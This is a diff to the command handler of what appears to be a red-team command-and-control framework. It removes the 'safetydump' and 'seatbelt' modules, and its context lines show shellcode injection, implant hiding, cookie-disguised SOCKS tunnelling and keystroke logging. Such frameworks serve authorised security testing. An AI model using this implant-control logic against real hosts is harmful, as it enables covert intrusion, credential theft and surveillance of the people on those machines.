@@ -75,10 +75,6 @@ def handle_sharp_command(command, user, randomuri, startup):
     elif command.startswith("hide-implant"):
         kill_implant(randomuri)
 
-    elif command.startswith("safetydump"):
-        check_module_loaded("SafetyDump.exe", randomuri, user)
-        new_task(command, user, randomuri)
-
     elif command.startswith("inject-shellcode"):
         params = re.compile("inject-shellcode", re.IGNORECASE)
         params = params.sub("", command)
@@ -123,10 +119,6 @@ def handle_sharp_command(command, user, randomuri, startup):
             new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)
         if ri.lower() == "y":
             new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)
-
-    elif command.startswith("seatbelt"):
-        check_module_loaded("Seatbelt.exe", randomuri, user)
-        new_task(command, user, randomuri)
 
     elif (command.startswith("stop-keystrokes")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
